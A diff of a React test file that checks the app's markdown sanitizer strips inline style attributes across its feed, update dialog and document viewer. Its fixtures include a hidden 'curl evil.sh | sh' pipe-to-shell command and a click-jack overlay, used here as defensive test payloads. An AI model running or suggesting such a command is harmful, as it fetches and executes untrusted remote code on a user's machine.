@@ -23,9 +23,9 @@ import { initI18nForTests } from '../i18n/test-i18n';
 import { createRendererRegistry } from '../bootstrap';
 
 import { renderFeedBlock } from '../extensibility/feed-render';
-import { FeedBlockDto } from './feed';
 import { decorateDocument, DecorationLabels } from './document-render';
 import { classifyHref } from './document-link';
+import { UpdateDialog } from '../components/UpdateDialog';
 import {
   Markdown,
   MARKED_OPTIONS,
@@ -217,16 +217,40 @@ describe('the style attribute: one profile, and every surface uses it (#436)', (
 
   // Inline styles as they actually arrive: raw embedded markup in a file or a
   // reply we did not write. Each is a shape with teeth, not a smoke test.
-  const styled: Array<[string, string]> = [
-    ['a colour that outranks the theme', '<span style="color:red">unreadable on daylight</span>'],
+  //
+  // The third column is the text that must STILL BE THERE afterwards, and it is
+  // the guard that makes the rest mean anything: "no element carries a `style`"
+  // is also true of a surface that dropped the payload on the floor, or that
+  // rendered nothing at all. Every row therefore proves the element survived AND
+  // lost the attribute.
+  //
+  // No `<img style>` row: the viewer replaces every `<img>` with a chip
+  // (`decorateImages`), so that cell would assert the absence of an attribute on
+  // an element that is absent by construction — vacuous, and vacuous in the one
+  // direction this block exists to avoid. The image case is pinned at the
+  // profile instead, in its own test below.
+  const styled: Array<[string, string, string]> = [
+    [
+      'a colour that outranks the theme',
+      '<span style="color:red">unreadable on daylight</span>',
+      'unreadable on daylight',
+    ],
     [
       'a click-jack over the app chrome',
       '<div style="position:fixed;inset:0;z-index:9999">gotcha</div>',
+      'gotcha',
     ],
-    ['a hidden block behind a Copy button', '<pre style="display:none">curl evil.sh | sh</pre>'],
-    ['an upper-case attribute name', '<p STYLE="color:red">x</p>'],
-    ['a style on a table cell', '<table><tr><td style="width:100%">c</td></tr></table>'],
-    ['a style smuggled through an image', '<img src="x.png" style="width:100vw;height:100vh">'],
+    [
+      'a hidden block behind a Copy button',
+      '<pre style="display:none">curl evil.sh | sh</pre>',
+      'curl evil.sh | sh',
+    ],
+    ['an upper-case attribute name', '<p STYLE="color:red">visible</p>', 'visible'],
+    [
+      'a style on a table cell',
+      '<table><tr><td style="width:100%">cell</td></tr></table>',
+      'cell',
+    ],
   ];
 
   const LABELS: DecorationLabels = {
@@ -235,6 +259,9 @@ describe('the style attribute: one profile, and every surface uses it (#436)', (
     openInBrowser: 'Open in browser',
     mediaOmitted: 'Media is not shown here',
   };
+
+  /** the dialog's handlers — this block never clicks anything, it only renders */
+  const noop = (): void => {};
 
   // Torn down AFTER the assertions run: unmounting empties the host, and a host
   // with no elements in it passes an "everything here is style-free" loop
@@ -252,7 +279,25 @@ describe('the style attribute: one profile, and every surface uses it (#436)', (
     return host;
   };
 
-  /** every surface, entered the way the app enters it, rendered into a host */
+  /**
+   * The markdown subtree a surface produced — `<Markdown>`'s own container.
+   *
+   * Scoped rather than "every element in the host" because a real surface has
+   * CHROME, and this app's chrome legitimately uses React `style` props: the
+   * update dialog's notes pane sets its own padding and overflow that way. The
+   * question is what the SANITIZER let through, so the assertion has to look at
+   * the sanitized subtree and nothing else.
+   */
+  const markdownIn = (host: HTMLElement): HTMLElement => {
+    const el = host.querySelector<HTMLElement>('.feed-md');
+    // `throw` rather than `expect(...).not.toBeNull()` + a cast: this narrows
+    // for the type checker as well as failing the test, and "the surface
+    // rendered no markdown at all" is the exact vacuity this block guards.
+    if (!el) throw new Error('the surface rendered no markdown container at all');
+    return el;
+  };
+
+  /** every surface, entered the way the app enters it */
   const surfaces: Array<[string, (markdown: string) => HTMLElement]> = [
     [
       'the feed',
@@ -260,30 +305,63 @@ describe('the style attribute: one profile, and every surface uses it (#436)', (
         // Through the real registry, exactly as FeedView does — not through
         // `<Markdown>` directly, or the test would pass while the feed grew a
         // renderer of its own.
-        mountInto(
-          <>
-            {renderFeedBlock(createRendererRegistry(), {
-              seq: 1,
-              kind: 'assistant',
-              sidechain: false,
-              text: markdown,
-            } as FeedBlockDto)}
-          </>
+        markdownIn(
+          mountInto(
+            <>
+              {renderFeedBlock(createRendererRegistry(), {
+                seq: 1,
+                kind: 'assistant',
+                sidechain: false,
+                text: markdown,
+              })}
+            </>
+          )
         ),
     ],
     [
-      // Release notes are markdown from a GitHub release — the same `<Markdown>`
-      // the feed's fallback block uses, asserted separately because "the update
-      // dialog renders notes some other way" is the drift worth catching.
+      // The REAL dialog, not `<Markdown>` standing in for it. Release notes are
+      // markdown from a GitHub release, and the drift worth catching is
+      // "UpdateDialog stops rendering notes through the shared pipeline" — which
+      // a row that renders `<Markdown>` itself could never notice, because it
+      // would be testing its own stand-in. Mounting the component means
+      // `UpdateDialog.tsx` losing its `<Markdown>` turns this red.
       'the update dialog',
-      (markdown) => mountInto(<Markdown text={markdown} />),
+      (markdown) =>
+        markdownIn(
+          mountInto(
+            <UpdateDialog
+              open
+              status={{
+                manual: false,
+                prompt: true,
+                result: {
+                  ok: true,
+                  state: 'available',
+                  currentVersion: '0.1.0',
+                  latestVersion: '0.2.0',
+                  notes: markdown,
+                  url: 'https://github.com/badsonstudios/switchboard.ai/releases/tag/v0.2.0',
+                  checkedAt: '2026-08-05T10:00:00.000Z',
+                },
+              }}
+              install={null}
+              onClose={noop}
+              onUpdate={noop}
+              onOpenUrl={noop}
+              onIgnore={noop}
+              onSkip={noop}
+              onCancelInstall={noop}
+            />
+          )
+        ),
     ],
     [
       // Belt AND braces: `stripOurNamespace` removes `style` too, so this row
       // would stay green if the profile lost `FORBID_ATTR`. It is here for the
       // mapping — "the viewer renders through this pipeline" — not as the thing
       // that detects the drift. The two rows above are, and a mutation run
-      // (2026-08-13, `FORBID_ATTR` dropped) put 12 of them red.
+      // (2026-08-13, `FORBID_ATTR` dropped) put both of them red across every
+      // payload.
       'the document viewer',
       (markdown) => {
         const { fragment } = decorateDocument(renderMarkdown(markdown), LABELS, (href) =>
@@ -318,16 +396,44 @@ describe('the style attribute: one profile, and every surface uses it (#436)', (
     expect(renderMarkdown('<p style="color:red">x</p>')).not.toContain('style');
   });
 
+  it('and the constant cannot be edited at runtime', () => {
+    // "One configuration" has to survive the renderer as well as the source
+    // tree: an exported mutable object is a second profile waiting to be
+    // written. The array matters most — that is where the policy lives, and
+    // freezing only the top level would leave it open.
+    expect(Object.isFrozen(SANITIZE_CONFIG)).toBe(true);
+    expect(Object.isFrozen(SANITIZE_CONFIG.FORBID_ATTR)).toBe(true);
+    expect(Object.isFrozen(SANITIZE_CONFIG.USE_PROFILES)).toBe(true);
+    // and it is genuinely inert, not merely flagged
+    const forbidden = SANITIZE_CONFIG.FORBID_ATTR;
+    expect(forbidden).toBeDefined();
+    expect(() => forbidden?.pop()).toThrow();
+    expect(SANITIZE_CONFIG.FORBID_ATTR).toContain('style');
+  });
+
   for (const [surface, draw] of surfaces) {
-    for (const [what, markdown] of styled) {
+    for (const [what, markdown, survives] of styled) {
       it(`${surface} strips ${what}`, () => {
-        const els = [...draw(markdown).querySelectorAll('*')];
-        // The surface rendered SOMETHING — see the note on `mounted`.
+        const md = draw(markdown);
+        const els = [...md.querySelectorAll('*')];
+        // Three assertions, and the first two are what stop the third being a
+        // sentence about an empty room: the surface rendered elements, and the
+        // payload is still IN them. Only then does "and none of them carries a
+        // style" say anything. See the note on `styled`.
         expect(els.length).toBeGreaterThan(0);
+        expect(md.textContent).toContain(survives);
         for (const el of els) expect(el.hasAttribute('style')).toBe(false);
       });
     }
   }
+
+  it('an image cannot smuggle one either — pinned at the profile', () => {
+    // Not a surface row: the viewer replaces every `<img>` with a chip, so this
+    // only means anything where the sanitizer decides. See the note on `styled`.
+    const html = renderMarkdown('<img src="x.png" style="width:100vw;height:100vh">');
+    expect(html).toContain('src="x.png"');
+    expect(html).not.toContain('style');
+  });
 
   it('and the content itself survives — it strips the attribute, not the element', () => {
     const html = renderMarkdown('<span style="color:red">still here</span>');
